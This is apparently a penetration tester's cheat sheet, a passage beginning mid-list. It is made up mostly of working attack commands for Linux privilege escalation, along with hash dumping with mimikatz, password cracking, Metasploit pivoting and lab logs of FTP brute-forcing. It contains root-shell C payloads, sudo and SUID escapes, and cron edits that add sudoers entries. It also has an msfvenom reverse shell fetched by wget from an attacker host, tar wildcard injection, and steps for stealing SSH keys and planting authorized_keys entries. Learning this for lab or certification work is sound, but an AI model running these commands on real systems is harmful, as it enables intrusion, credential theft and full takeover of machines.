    - `find / -perm -o+w -type f -ls 2>/dev/null | grep /etc`
- Checking Environmental variables
    - `echo $PATH`
        - Check if there is writable folder in PATH
- SUID / GUID permission files
    - `find / -type f -perm -04000 -ls 2>/dev/null` / `find / -type f -perm -u=s -ls 2>/dev/null`
    - `find / -type f -perm -02000 -ls 2>/dev/null` / `find / -type f -perm -g=s -ls 2>/dev/null`
- 


**Information Enumeration**

- Ways to upload file

    - `find / -name wget  2>/dev/null `
    - `find / -name netcat  2>/dev/null `
    - `find / -name nc  2>/dev/null `
    - `find / -name ftp 2>/dev/null`

- SSH private and public key hunting

    - `ls -la /home /root /etc/ssh /home/*/.ssh/`
    - `find / -name authorized_keys 2> /dev/null`
    - `locate id_rsa` / `locate id_dsa` / `find / -name id_rsa 2> /dev/null` / `find / -name id_dsa 2> /dev/null`
    - `cat /home/*/.ssh/id_rsa` / `cat /home/*/.ssh/id_dsa`
    - `cat /etc/ssh/ssh_config` / `cat /etc/sshd/sshd_config`
    - `cat ~/.ssh/authorized_keys` / `cat ~/.ssh/identity.pub` / `cat ~/.ssh/identity` / `cat ~/.ssh/id_rsa.pub` / `cat ~/.ssh/id_rsa` / `cat ~/.ssh/id_dsa.pub` / `cat ~/.ssh/id_dsa`

- Any settings/files (hidden) on website, Any settings file with database information

    - `ls -alhR /var/www/` / `ls -alhR /srv/www/htdocs/` / `ls -alhR /usr/local/www/apache22/data/` / `ls -alhR /opt/lampp/htdocs/` / `ls -alhR /var/www/html/`
- Checking logs file in directories

    - `/etc/httpd/logs`
    - `/var/log/`

- Development tools/languages are installed/supported

    - `cat /proc/version` (tellls us if `gcc` is installed)
    - `find / -name python 2>/dev/null`
    - `find / -name perl 2>/dev/null`

**Serivces Enumeration**

- Services Running and their Privileges
    - `ps`, `ps aux`, `ps aux | grep root`
        - check which services are running by root, and which are vulnerable

**Cron Jobs Enumeration**

- Checking system-wide cron jobs    
    - `crontab -l`
    - `cat /etc/crontab`
        - check cron jobs of root user, analyse content of file assosiated

**File System Enumeration**

- How are files system mounted
    - `mount`, `df -h`
- Are there any unmounted file-systems
    - `cat /etc/fstab`

### [Linux Privilege Escalation](#)

**Privilege Escalation by Kernel Exploits**

- Linux Exploit Suggestor
    - `/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`
        - suggested dirtycow exploit, downloaded and used
    - `mv 40839.c dirtcowexploit.c` >`python -m http.server 80` > `wget http://10.17.107.227/dirtcowexploit.c -P /tmp/` > `cd /tmp` > `gcc dirtcowexploit.c -pthread -o dirty -lcrypt` > `./dirty` > `su firefart`

- Exploit DB
    - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`

**Privilege Escalation by SUDO Permissions**

- Privilege Escalation by SUDO (Shell Escaping)
    - `sudo man ls` > `!/bin/bash`
    - `sudo nano /etc/sudoers` > `karen ALL=NOPASSWD:ALL` > `sudo su`
    - `sudo nano` > `Ctrl+R then Ctrl+X,` > `sh 1>&0 2>&0`
    - `sudo find . -exec /bin/sh \; -quit`
    - `sudo awk 'BEGIN {system("/bin/sh")}'`
    - `sudo vim -c '!sh'`
    - `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
    - `sudo apache2 -f /etc/shadow`
- Privilege Escalation by SUDO (Shared object Injection through env variable `LD_PRELOAD` and `LD_LIBRARY_PATH`)
    - `nano exploit.c`
        ```
        #include <stdio.h>
        #include <stdlib.h>
        #include <sys/types.h>
        void _init() {
            unsetenv("LD_PRELOAD");
            setuid(0);
            setgid(0);
            system("/bin/bash -p");
            }   
        ```
        -  `gcc -fPIC -shared -nostartfiles -o ./libncursesw.so.6 ./exploit.c` > `sudo LD_PRELOAD=./libncursesw.so.6 nano`

    - `nano /tmp/preload.c`
        ```
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
                unsetenv("LD_PRELOAD");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }

        ```
        - `gcc -shared -fPIC -nostartfiles -o /tmp/preload.so /tmp/preload.c` > `sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2`

    - `ldd /usr/sbin/apache2` > `nano /home/user/tools/sudo/library_path.c`
        ```
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
                unsetenv("LD_LIBRARY_PATH");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }
        ```
        - `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c` > `sudo LD_LIBRARY_PATH=/tmp apache2`

**Privilege Escalation by SUID Permissions**

- Privilege Escalation by - SUID (Abusing intented binary functionality using `GTFOBins`)

    - `find / -type f -perm -04000 -ls 2>/dev/null` > `base64 /etc/shadow | base64 --decode` > `base64 /etc/passwd | base64 --decode` > `unshadow passwd.txt shadow.txt > crackme.txt` > `john --wordlist=/home/kali/rockyou.txt crackme.txt `

- Privilege Escalation by - SUID (`Shared Object Injection`)

    - `find /home -user root -perm -4000 -exec ls -la {} \;`
        ```
        -rwsr-xr-x 1 root root 8344 Sep 22  2018 /home/student/welcome
        ```
        - `strings welcome` 
        ```
        /lib64/ld-linux-x86-64.so.2
        libc.so.6
        setuid
        system
        __cxa_finalize
        __libc_start_main   
        greetings
        ;*3$"
        GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0
        crtstuff.c
        ```
        - `rm greetings` > `cp /bin/bash greetings` > `./welcome`

    - `find / -type f -perm -04000 -ls 2>/dev/null` > `strings /usr/local/bin/suid-so`
        ```
        /lib64/ld-linux-x86-64.so.2
        #eGVO
        CyIk
        libdl.so.2
        Calculating something, please wait...
        /home/user/.config/libcalc.so
        Done.
        Y@-C
        ```
        - `ls /home/user/.config`
        ```
        ls: cannot access /home/user/.config: No such file or directory
        ```
        - `nano  /home/user/.config/libcalc.c` 
        ```
        #include <stdio.h>
        #include <stdlib.h>

        static void inject() __attribute__((constructor));

        void inject() {
            system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
        }
        ```
        -  `/usr/local/bin/suid-so`

    
- Privilege Escalation by - SUID (Binary Symlinks) / Nginx vulnerability / CVE-2016-1247

    - `dpkg -l | grep nginx` 
        ```
        ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
        ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
        ```
            - for this exploit you should be `www-data` user
        - `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`

- Privilege Escalation by - SUID (Known Exploits)

    -  `find / -type f -perm -04000 -ls 2>/dev/null` > `/home/user/tools/suid/exim/cve-2016-1531.sh`

- Privilege Escalation by - SUID (Enviornment Variables)

    - `find / -type f -perm -04000 -ls 2>/dev/null` > `strings /usr/local/bin/suid-env`
        ```
        /lib64/ld-linux-x86-64.so.2
        5q;Xq
        __gmon_start__
        libc.so.6
        setresgid
        setresuid
        system
        __libc_start_main
        GLIBC_2.2.5
        fff.
        fffff.
        l$ L
        t$(L
        |$0H
        service apache2 start
        ```
        - `/usr/local/bin/suid-env` > 
        ```
        sh: service: command not found
        ```
        - `echo $PATH` > `export PATH=/tmp:$PATH` > `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c` > `gcc /tmp/service.c -o /tmp/service` > `/usr/local/bin/suid-env`

- Privilege Escalation by - SUID (`Abusing Shell Features`)

    - `find / -type f -perm -04000 -ls 2>/dev/null` > `strings /usr/local/bin/suid-env2`
        ```
        /lib64/ld-linux-x86-64.so.2
        __gmon_start__
        libc.so.6
        setresgid
        setresuid
        system
        __libc_start_main
        GLIBC_2.2.5
        fff.
        fffff.
        l$ L
        t$(L
        |$0H
        /usr/sbin/service apache2 start  
        ```
        - `/bin/bash --version`
        ```
        GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
        Copyright (C) 2009 Free Software Foundation, Inc.
        License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
        ```
        - `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }` > `export -f /usr/sbin/service` > `/usr/local/bin/suid-env2`

**Privilege Escalation by Cron Jobs**

- Privilege Escalation - Cron (abusing cron job created by root user if found)

    - `ls -al`
        - found a file message with permission -rw-------
    - `cat message`
        - permission denied
        - checking if path of this file used anywhere
    - `grep -rnw /usr -e "/home/student/message"`
        ```
        /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
        ```
        - found it in copy.sh sexond line, its copying itself into /tmp/message
    - `ls -al /usr/local/share/copy.sh`
        ```
        -rwxrwxrwx 1 root root 74 Sep 23  2018 /usr/local/share/copy.sh
        ```
    - `cat /usr/local/share/copy.sh`
        ```
        #! /bin/bash
        cp /home/student/message /tmp/message
        chmod 644 /tmp/message
        ```
    - `printf '#!bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
        - we addedd permission for student in sudoers
        - once cron job is run we can sudo and get root
    - `sudo su`

- Privilege Escalation  - Cron (Utilising writable foleder in `PATH` variable)
    - `cat /etc/crontab`
        ```
        PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

        # m h dom mon dow user  command
        17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
        25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
        47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
        52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
        #
        * * * * * root overwrite.sh
        * * * * * root /usr/local/bin/compress.sh
        ```
        -  `echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >/home/user/overwrite.sh` > `chmod +x /home/user/overwrite.sh` > `/tmp/bash -p`

- Privilege Escalation  - Cron (File Overwrite)

    - `cat /etc/crontab`
        ```
        # m h dom mon dow user  command
        17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
        25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
        47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
        52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
        #
        * * * * * root overwrite.sh
        * * * * * root /usr/local/bin/compress.sh
        ```
        - `cat /usr/local/bin/compress.sh`
        ```
        #!/bin/sh
        cd /home/user
        tar czf /tmp/backup.tar.gz *
        ```
        - `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh` > `/tmp/bash -p`

- Privilege Escalation  - Cron (Wildcard)

    - `cat /etc/crontab` > `cat /usr/local/bin/compress.sh`
        ```
        #!/bin/sh
        cd /home/user
        tar czf /tmp/backup.tar.gz *
        ```
        - `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.17.107.227 LPORT=4444 -f elf -o reverseshell.elf` > `python -m http.server 80`
        - `wget http://10.17.107.227/reverseshell.elf -P /tmp/` > `mv /tmp/reverseshell.elf /home/user/`
        - `touch /home/user/--checkpoint=1`
        - `touch /home/user/--checkpoint-action=exec=reverseshell.elf`
        - Now we can listen on our machine, when cron job would run we get root
        - `nc -nlvp 4444`

**Privilege Escalation by Exploiting SSH Keys or Password in config files**

- Public and private keys are generally stored in one of the following locations:
    - `/root/.ssh/`
    - `/home/user_name/.ssh/` (users home directory)
    - `/etc/ssh/`
    - In the paths specified in the `/etc/ssh/ssh_config` or `/etc/ssh/sshd_config` config files

- Two ways to exploit

    - `Accessing readable private SSH keys and using them to authenticate`
        - find private key
        - copy the conetent of it or else get it transfered ot our attacker machine
        - create a file and copy the contetnt in it
        - it needs to be only readable and writable only by its owner
            - `chmod 600 key_name`
        - finally login as the that user
            - `ssh -i key_name user_name@X.X.X.X`

    - `Accessing writable public SSH keys and adding your own one to them to authenticate`
        - The `authorized_keys` file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. 
        - So If the authorized_keys file is writable `rwxrwxrwx` to the current user, `this can be exploited by adding additional authorized keys.`
        - So We simply need to generate new public and private key pair, then copy the public key into server's `authorised keys` file
            - In case we already have ssh access we can simply do by using `ssh-copy-id`
                - `ssh-copy-id user_name@X.X.X.X`
            - or we can also simply by using cat to output the contents of the id_rsa.pub file and redirect it to the authorized_keys file
                - `cat ~/.ssh/id_rsa.pub | ssh user_name@X.X.X.X "cat >> /home/user_name/.ssh/authorized_keys"`

- The following command can be used to identify any existing public or private keys and their permissions:
    - `ls -la /home /root /etc/ssh /home/*/.ssh/`
    - `find / -name authorized_keys 2> /dev/null`
    - `locate id_rsa` / `locate id_dsa` / `find / -name id_rsa 2> /dev/null` / `find / -name id_dsa 2> /dev/null`
    - `cat /home/*/.ssh/id_rsa` / `cat /home/*/.ssh/id_dsa`
    - `cat /etc/ssh/ssh_config` / `cat /etc/sshd/sshd_config`
    - `cat ~/.ssh/authorized_keys` / `cat ~/.ssh/identity.pub` / `cat ~/.ssh/identity` / `cat ~/.ssh/id_rsa.pub` / `cat ~/.ssh/id_rsa` / `cat ~/.ssh/id_dsa.pub` / `cat ~/.ssh/id_dsa`

**Privilege Escalation by Misconfigured NFS (Network File Sharing)**

- check for `“no_root_squash” ` in `/etc/exports` file

    ```
    karen@ip-10-10-17-59:/$ `cat /etc/exports`

    # /etc/exports: the access control list for filesystems which may be exported
    #               to NFS clients.  See exports(5).
    #
    # Example for NFSv2 and NFSv3:
    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
    #
    # Example for NFSv4:
    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
    #
    /home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
    /home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
    ```
- If the `“no_root_squash”` option is present on a writable share, we can create an executable with SUID bit set and run it on the target system

    - Enumerate mountable shares from our attacking machine.
        - `showmount -e 10.10.17.59`

    - we can mount above shares, we are interested in `no_root_sqash` so will mount /home/backup
     - `mkdir /tmp/targetsharebackup` > `mount -o rw 10.10.17.59:/home/backup /tmp/targetsharebackup `

    - Now since As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.
     - `cd /tmp/targetsharebackup` 

        ```
        ┌──(root㉿kali)-[/tmp/targetsharebackup]
        └─# `nano nfc.c`  

        #include<unistd.h>
        void main (){
        setuid(0);
        setgid(0);
        system("/bin/bash");
        }
        ```
    - Complie the code to create executable and give SUID permission
     - `gcc nfc.c -o nfs` > `chmod u+s nfs`
            
    - get back to Target machine You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).

    - run the binary and get Root access
        - ``./home/backup/nfs`` > `id`

**Privilege Escalation by PATH writable folder**

Conditions Required
    - There should be a file wih SUID permission created by root user.
    - This file should be executing some other file of which absolute path is not mentioned , therfore it will look for PATH vairable for this file
        ```
        ┌──(root㉿kali)-[/home/kali/Desktop]
        └─# `cat testelf_code.c` 
        #include<unistd.h>
        void main (){
        setuid(0);
        setgid(0);
        system("thm");
        }
        ```
    - you should have write privileges to folder in PATH
    - you can then create `thm` file in that folder  put malicious code in it
    ```
    ┌──(user㉿kali)-[/tmp]
    └─$ `echo "/bin/bash" > thm`
    ```
    - you can then give it rwx permission
        - ``chmod 777 thm``
    - further you can execute the SUID binary and get root access
        - ``./testelf` > `id`


### [Encryption, (Hash Identification, Generation,  Dumping) and Password Cracking](#)

**Encryption**

- GNU Privacy Guard (GPG or gpg)
    - Encrypting (need to give password in prompt)- `gpg -c file1.txt `
    - Hiding/renaming - ` mv file1.txt.gpg critical_data.doc`
    - Decrypting (using password in prompt)- `gpg -d critical_data.doc `
    - Decrypting without password
        - Bruteforce using John
            - Convert encryted file to hash
                - `gpg2john [encrypted gpg file] > [filename of the hash you want to create]`
            - Brute force using John
                - `john wordlist=[location/name of wordlist] --format=gpg [name of hash we just created]`


- OpenSSL
    - Encrypt file
        - `openssl aes-256-cbc -e -in message.txt -out encrypted_message`
    - Decrypt file
        - `openssl aes-256-cbc -d -in encrypted_message -out original_message.txt`
    - Encryption more secure and resilient against brute-force attacks
        - use the Password-Based Key Derivation Function 2 (PBKDF2)
            - `openssl aes-256-cbc -pbkdf2 -iter 10000 -e -in message.txt -out encrypted_message`
        - Decryption 
            - `openssl aes-256-cbc -pbkdf2 -iter 10000 -d -in encrypted_message -out original_message.txt`

**Hash Identification**

- Linux hashes in /etc/passwd based on diffrent crypt schemes

    - Traditional DES based scheme (Default Password Encryption algorithm)
        - `Kyq4bCxAXJkbg`

    - BSDI extended DES Scheme
        - `_EQ0.jzhSVeUyoSqLupI`

    - MD5-based scheme
        - `$1$etNnh7FA$OlM7eljE/B7F1J4XYNnk81`

    - Bcrypt - Blowfish-based scheme
        - Hashes starts with `$2$, $2a$, $2b$, $2x$ or $2y$ `depending on which variant of the algorithm is used
            - Example - `$2a$10$VIhIOofSMqgdGlL4wzE//e.77dAQGqntF/1dT7bqCrVtquInWy2qi`

    - NT Hash based scheme
        - `$3$$8846f7eaee8fb117ad06bdd830b7586c`

    - SHAcrypt - SHA-2 (SHA-256 and SHA-512) based schem
        - H ashes starts with `$5$ (for SHA-256) or $6$ (for SHA-512)` depending on which SHA variant is used
            - SHA-256 - `$5$9ks3nNEqv31FX.F$gdEoLFsCRsn/WRN3wxUnzfeZLoooVlzeF4WjLomTRFD`
            - SHA-512 - `$6$qoE2letU$wWPRl.PVczjzeMVgjiA8LLy2nOyZbf7Amj3qLIL978o18gbMySdKZ7uepq9tmMQXxyTIrS12Pln.2Q/6Xscao0`

    - Scrypt - Password Based Key Derivate Function (PBKFD) based scheme
        - `$7$DU..../....2Q9obwLhin8qvQl6sisAO/$sHayJj/JBdcuD4lJ1AxiwCo9e5XSi8TcINcmyID12i8`

    - Scrypt+SHA256 based scheme
        - `$8$mTj4RZG8N9ZDOk$elY/asfm8kD3iDmkBe3hD2r4xcA/0oWS5V3os.O91u.`

    - Yescrypt
        - `$y$j9T$F5Jx5fExrKuPp53xLKQ..1$X3DX6M94c7o.9agCG9G317fhZg9SqC.5i5rd.RhAtQ7`

- Windows NTLM hash
    - `Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::`
    - It is combination of NT and LM hash, LM hash is same for all users on system
        - NT Hash - `e3c61a68f1b89ee6c8ba9507378dc88d`
        - LM Hash - `aad3b435b51404eeaad3b435b51404ee`

**Linux hashed password generation**

- OpenSSL
    ```
    student@attackdefense:~$ `openssl passwd -1 -salt abc password123`
    $1$abc$UWUoROXzUCsLsVzI0R2et.
    ```
- mkpasswd
    ```
    ┌──(kali㉿kali)-[~]
    └─$ `mkpasswd -m sha-512 newpasswordhere`
    $6$oTvKrJiKZIcu/MLj$q8t7Ip.Plc4rfdRjyUlL9bEx2loeDcROEHph.syr/7.56YGKAPUMNkMQpavEbGo7T3nt/XXZDsuAiz7DlVFpQ.
    ```

**Hash Dumping**

- Windows
    - Using inbuilt meterpreter extension `Kiwi`
        - Migrating to `LSASS` process
            - `pgrep lsass` > `migrate 788`
        - load and run kiwi
            - `load kiwi` > `creds_all` > `lsa_dump_sam`

    - Using Mimikatx executable
        - Migrating to `LSASS` process
            - `pgrep lsass` > `migrate 788`
        - Upload mimikatz executable
            - `mkdir temp` > `cd temp` > `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
        - Run mimikatxz executable
            - ` shell` > `.\mimikatz.exe ` 
            - Confirm that you have elevated privileges that mimikatz requires
                - `privilege::debug`
            - Dump the SAM database hashes
                - `lsadump::sam`

    - Dumping hashes using meterpreter `hashdump`
        - `hashdump`

-Linux
    - Manually - `cat /etc/shadow`
    - Metasploit -  `post/linux/gather/hashdump`

**Password Cracking**


- Unshadow
    - `unshadow passwd.txt shadow.txt > crackme.txt`

- John
    - `john --wordlist=/home/kali/rockyou.txt crackme.txt `
    - `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
    - `john --wordlist=rockyou.txt hash.txt`

- Hashcat
    - `hashcat -m 0 -a 0 md5.txt rockyou.txt`



### [Pivoting](#)

**Pivoting by Port forwarding (using metasploit)**

- Identify the Network interfaces
    - `ipconfig`
- Add route to your current subnet to access other network available
    - `run autoroute -s 10.5.26.0/20`
        - With this we actually addedd route to our msfconsole, now we can access any device from this msfconsole
    - we can also list routes
        - `run autoroute -p`
            - Addiing route wont allow you to execute anythin other than metasloit modules,  so its not like we can do nmap scan on victim 2 just by adding route, but instead we can user modules like portscan etc
- Port scanning on other network IP within same subnet (we already have IP in this case)
    - `search portscan` > `use auxiliary/scanner/portscan/tcp` > `set RHOSTS 10.5.31.52` > `set PORTS 1-100` > `exploit`
        - We observe that we have port 80 open on victim 2, but we still cant access it directly (not by any way)
    - To perform a Nmap scan we will need to Forward port 80 on victim 2 to a port on our local host which is the kali linux instance.
- Port Forwarding
    - `portfwd add -l 1234 -p 80 -r 10.5.31.52`
        - Now we can do nmap scan by specifying port 1234 and kali linux ip/localhost which will eventually do nmap scan for port 80 of victim 2 machine
- Scanning port 80 on victim2 by using port 1234 on our kali
    - `db_nmap -p 1234 -sS -sV localhost`
- Further we can exploit if service running is vulnerable
    - `use windows/http/badblue_passthru` > `set payload windows/meterpreter/bind_tcp` > `set payload windows/meterpreter/bind_tcp` > `set payload windows/meterpreter/bind_tcp` > `set LPORT 4433` > `exploit`




*****************************************************************************
```
root@attackdefense:~# `nmap -p 80 -sV 10.5.17.75 --script http-methods --script-args http-methods.url-path=/webdav/`
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-11 15:41 IST
Nmap scan report for 10.5.17.75
Host is up (0.0021s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|   Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Path tested: /webdav/
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds

root@attackdefense:~# `nmap -p 80 -sV 10.5.17.75 --script http-webdav-scan --script-args http-methods.url-path=/webdav/`
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-11 15:40 IST
Nmap scan report for 10.5.17.75
Host is up (0.0022s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-webdav-scan: 
|   Server Date: Mon, 11 Dec 2023 10:11:00 GMT
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/10.0
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds


```


*****************************************************************************
```
root@attackdefense:~# `nmap 192.60.4.3 -p 21` 
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-07 04:49 UTC
Nmap scan report for target-1 (192.60.4.3)
Host is up (0.000010s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:C0:3C:04:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
root@attackdefense:~# `nmap 192.60.4.3 -sV -p 21`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-07 04:49 UTC
Nmap scan report for target-1 (192.60.4.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:3C:04:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds

root@attackdefense:~# `nmap 192.176.71.3 -p 21 --script ftp-anon`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-07 05:42 UTC
Nmap scan report for target-1 (192.176.71.3)
Host is up (0.000057s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
MAC Address: 02:42:C0:B0:47:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds

root@attackdefense:~# `ftp 192.60.4.3 `   
Connected to 192.60.4.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.60.4.3]
Name (192.60.4.3:root): 
331 Password required for root
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> `ls`
530 Please login with USER and PASS
ftp: bind: Address already in use
ftp> `bye`
221 Goodbye.

root@attackdefense:~# `ftp 192.77.31.3`
Connected to 192.77.31.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.77.31.3]
Name (192.77.31.3:root): `anonymous`
331 Password required for anonymous
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> `exit`
221 Goodbye.
root@attackdefense:~# 

root@attackdefense:/# `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.60.4.3 ftp`
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-07 05:07:59
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://192.60.4.3:21/
[21][ftp] host: 192.60.4.3   login: sysadmin   password: 654321
[21][ftp] host: 192.60.4.3   login: rooty   password: qwerty
[21][ftp] host: 192.60.4.3   login: demo   password: butterfly
[21][ftp] host: 192.60.4.3   login: auditor   password: chocolate
[21][ftp] host: 192.60.4.3   login: anon   password: purple
[21][ftp] host: 192.60.4.3   login: administrator   password: tweety
[21][ftp] host: 192.60.4.3   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-07 05:08:36

root@attackdefense:/# `nmap 192.60.4.3 --script ftp-brute --script-args userdb=/users -p 21`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-07 05:23 UTC
Nmap scan report for target-1 (192.60.4.3)
Host is up (0.000060s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: 
|     sysadmin:654321 - Valid credentials
|_  Statistics: Performed 25 guesses in 5 seconds, average tps: 5.0
MAC Address: 02:42:C0:3C:04:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.36 seconds

root@attackdefense:/# `ftp 192.60.4.3`       
Connected to 192.60.4.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.60.4.3]
Name (192.60.4.3:root): `sysadmin`
331 Password required for sysadmin
Password:
230 User sysadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> `ls`
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> `get secret.txt`
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (473.9200 kB/s)
ftp> `bye`
221 Goodbye.
root@attackdefense:/# `ls`
0  bin  boot  dev  etc  home  lib  lib32  lib64  media  mnt  opt  proc  root  run  sbin  secret.txt  srv  startup.sh  sys  tmp  usr  var
root@attackdefense:/# `cat secret.txt`
260ca9dd8a4577fc00b7bd5810298076

root@attackdefense:~# `nmap 192.238.103.3 -p 22 -sV -O`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-08 05:03 UTC
Nmap scan report for target-1 (192.238.103.3)
Host is up (0.000061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:EE:67:03 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
